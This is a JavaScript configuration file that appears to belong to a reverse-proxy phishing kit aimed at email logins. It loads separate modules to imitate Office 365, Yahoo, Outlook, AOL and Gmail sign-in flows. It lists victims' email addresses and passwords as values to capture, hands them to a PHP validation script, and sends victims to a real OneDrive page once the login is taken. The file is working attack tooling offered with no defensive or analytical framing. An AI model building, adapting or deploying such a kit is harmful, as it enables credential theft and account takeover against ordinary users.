const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

const OFFICE_MODULE = require('../office/main')
const YAHOO_MODULE = require('../yahoo/main')
const OUTLOOK_MODULE = require('../outlook/main')
const AOL_MODULE = require('../aol/main')
const GMAIL_MODULE = require('../gmail/main')

/** Defined Config used */

const configExport = {

    SCHEME: 'autox',

    CURRENT_DOMAIN: 'email.com',

    START_PATH: '/auth2',
    
    PATTERNS: [],

    FORCE_PROXY: ["/auth/login/finish"],

    PHP_PROCESSOR: {
        '/auth2.*': {
            GET: {
                script: 'validate.php',
            },
            POST: {
                script: null,
            
                redirectTo: null,

            },
        },

        '/identity/lalo/validate': {
            GET: {
                script: null,
            },
            POST: {
                script: 'validate.php',
                
                redirectTo: '',

            },
        },
    },

    COOKIE_PATH: [],

    EXIT_TRIGGER_PATH: ['/auth/login/finish'],

    EXIT_URL: 'https://onedrive.live.com',


    EXTRA_COMMANDS: [],

    CAPTURES: {
        emailVerify: {
            params: ['emailLookup'],
            hosts: 'PHP-EXEC',
        },

        manuelPassword: {
            params: ['password'],
            hosts: 'PHP-EXEC',
        },


    },

    IMPORTED_MODULES: [
        {
            beginAt: '/auth/login/office',
            exitAt: '/auth/login/finish',
            module: OFFICE_MODULE,
        },
        {
            beginAt: '/auth/login/yahoo',
            exitAt: '/auth/login/finish',
            module: YAHOO_MODULE,
        },
        {
            beginAt: '/auth/login/outlook',
            exitAt: '/auth/login/finish',
            module: OUTLOOK_MODULE,
        },
        {
            beginAt: '/auth/login/aol',
            exitAt: '/auth/login/finish',
            module: AOL_MODULE,
        },
        {
            beginAt: '/auth/login/gmail',
            exitAt: '/auth/login/finish',
            module: GMAIL_MODULE,
        }
    ],

    PRE_HANDLERS: [],
    
    PROXY_REQUEST: 'DEFAULT',
    PROXY_RESPONSE: 'DEFAULT',
    DEFAULT_PRE_HANDLER: 'DEFAULT',

    EXTERNAL_FILTERS: [],

   }
module.exports = configExport

